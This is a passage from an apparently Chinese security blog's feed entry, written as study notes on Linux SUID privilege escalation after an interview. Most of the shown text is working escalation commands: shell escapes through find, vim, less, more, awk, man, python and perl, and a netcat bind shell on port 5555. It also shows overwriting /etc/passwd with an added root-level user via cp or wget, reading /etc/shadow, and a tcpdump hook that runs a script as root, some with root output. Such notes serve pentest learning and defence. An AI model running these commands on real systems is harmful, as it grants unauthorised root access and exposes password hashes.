find"></a>2.2 find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure><p>nc 反弹 shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;</span><br></pre></td></tr></table></figure><h3 id="2-3-vi-vim"><a href="#2-3-vi-vim" class="headerlink" title="2.3 vi/vim"></a>2.3 vi/vim</h3><p>打开vim,按下ESC</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -<span class="keyword">c</span> '<span class="title">!sh</span>'</span><br></pre></td></tr></table></figure><h3 id="2-4-bash"><a href="#2-4-bash" class="headerlink" title="2.4 bash"></a>2.4 bash</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(service)</span><br></pre></td></tr></table></figure><h3 id="2-5-less"><a href="#2-5-less" class="headerlink" title="2.5 less"></a>2.5 less</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure><h3 id="2-6-more"><a href="#2-6-more" class="headerlink" title="2.6 more"></a>2.6 more</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more <span class="meta-keyword">/home/</span>pelle/myfile</span><br><span class="line">!<span class="meta-keyword">/bin/</span>bash</span><br></pre></td></tr></table></figure><h3 id="2-7-cp"><a href="#2-7-cp" class="headerlink" title="2.7 cp"></a>2.7 cp</h3><p>覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">zabbix@</span>localhost ~]$ cat /etc/passwd &gt;passwd</span><br><span class="line"><span class="number">2.</span>[<span class="symbol">zabbix@</span>localhost ~]$ openssl passwd <span class="number">-1</span> -salt hack hack123</span><br><span class="line"><span class="number">3.</span>$<span class="number">1</span>$hack$WTn0dk2QjNeKfl.DHOUue0</span><br><span class="line"><span class="number">4.</span>[<span class="symbol">zabbix@</span>localhost ~]$ echo <span class="string">'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash'</span> &gt;&gt; passwd</span><br><span class="line"><span class="number">5.</span>[<span class="symbol">zabbix@</span>localhost ~]$ cp passwd /etc/passwd</span><br><span class="line"><span class="number">6.</span>[<span class="symbol">zabbix@</span>localhost ~]$ su - hack</span><br><span class="line"><span class="number">7.</span>Password:</span><br><span class="line"><span class="number">8.</span>[<span class="symbol">root@</span><span class="number">361</span>way ~]# id</span><br><span class="line"><span class="number">9.</span>uid=<span class="number">0</span>(hack) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">10.</span>[<span class="symbol">root@</span><span class="number">361</span>way ~]# cat /etc/passwd|tail <span class="number">-1</span></span><br><span class="line"><span class="number">11.</span>hack:$<span class="number">1</span>$hack$WTn0dk2QjNeKfl.DHOUue0:<span class="number">0</span>:<span class="number">0</span>::/root/:/bin/bash</span><br></pre></td></tr></table></figure><h3 id="2-8-mv"><a href="#2-8-mv" class="headerlink" title="2.8 mv"></a>2.8 mv</h3><p>覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p><h3 id="2-9-nano"><a href="#2-9-nano" class="headerlink" title="2.9 nano"></a>2.9 nano</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano  <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><h3 id="2-10-awk"><a href="#2-10-awk" class="headerlink" title="2.10 awk"></a>2.10 awk</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '<span class="keyword">BEGIN</span> &#123;<span class="keyword">system</span>(<span class="string">"/bin/sh"</span>)&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure><h3 id="2-11-man"><a href="#2-11-man" class="headerlink" title="2.11 man"></a>2.11 man</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">man</span> <span class="string">passwd</span></span><br><span class="line"><span class="comment">!/bin/bash</span></span><br></pre></td></tr></table></figure><h3 id="2-12-wget"><a href="#2-12-wget" class="headerlink" title="2.12 wget"></a>2.12 wget</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.1</span>:<span class="number">8080</span><span class="regexp">/passwd -O /</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h3 id="2-13-apache"><a href="#2-13-apache" class="headerlink" title="2.13 apache"></a>2.13 apache</h3><p>仅可查看文件，不能弹 shell：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache2 -f <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure><h3 id="2-14-tcpdump"><a href="#2-14-tcpdump" class="headerlink" title="2.14 tcpdump"></a>2.14 tcpdump</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $<span class="string">'id\ncat /etc/shadow'</span> &gt; <span class="regexp">/tmp/</span>.test</span><br><span class="line">chmod +x <span class="regexp">/tmp/</span>.test</span><br><span class="line">sudo tcpdump -ln -i eth0 -w <span class="regexp">/dev/</span><span class="keyword">null</span> -W <span class="number">1</span> -G <span class="number">1</span> -z <span class="regexp">/tmp/</span>.test -Z root</span><br></pre></td></tr></table></figure><h3 id="2-15-python-perl-ruby-lua-php-etc"><a href="#2-15-python-perl-ruby-lua-php-etc" class="headerlink" title="2.15 python/perl/ruby/lua/php/etc"></a>2.15 python/perl/ruby/lua/php/etc</h3><p>python</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import os;os.system('/bin/bash')"</span></span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">"/bin/bash"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://touhidshaikh.com/blog/?p=790" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation)</a></li><li><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">【安全科普】Linux提权——利用可执行文件SUID</a></li><li><a href="https://www.jianshu.com/p/e6c4c4bdf7c3" target="_blank" rel="noopener">linux特殊权限SUID、SGID、SBIT</a></li><li><a href="http://101.200.63.12/index.php/archives/521/" target="_blank" rel="noopener">SUID 提权 - CoColi丶</a></li><li><a href="https://evi1cg.me/archives/SUID_Privilege_Escalation.html" target="_blank" rel="noopener">SUID Privilege Escalation - Evi1cg</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;面试时发现关于 SUID 并不是很清楚，所以学习记录下&lt;/p&gt;
&lt;h2 id=&quot;0x01-关于-SUID&quot;&gt;&lt;a href=&quot;#0x01-关于-SUID&quot; class=&quot;headerlink&quot; title=&quot;0x01 关于 SUID&quot;&gt;&lt;/a&gt;0x01 关于 SUID&lt;/h2&gt;&lt;p&gt;SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。&lt;/p&gt;
&lt;p&gt;那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Linux" scheme="https://jlkl.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
